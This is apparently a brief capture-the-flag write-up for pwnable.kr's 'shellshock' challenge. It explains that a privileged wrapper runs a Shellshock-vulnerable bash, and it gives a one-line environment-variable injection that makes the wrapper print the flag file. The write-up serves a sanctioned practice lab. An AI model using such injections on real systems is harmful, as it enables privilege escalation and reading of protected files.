# Shellshock

## The Challenge

Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :\)

ssh shellshock@pwnable.kr -p2222 \(pw:guest\)

## The Solution

Let's look at the files.

![](../.gitbook/assets/image%20%2837%29.png)

What is the purpose of this bash binary?

The binary is running with shellshock\_pwns privileges. What is it doing?

![](../.gitbook/assets/image%20%2841%29.png)

It runs the bash binry with shellshock\_pwns privileges. what's so special about that bash? As the name of the challenge suggests, this bash is vulnerable to [shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29).

![](../.gitbook/assets/image%20%2838%29.png)

Here is the solution for ya'll:

```text
env x='() { :;}; /bin/cat flag' ./shellshock
```

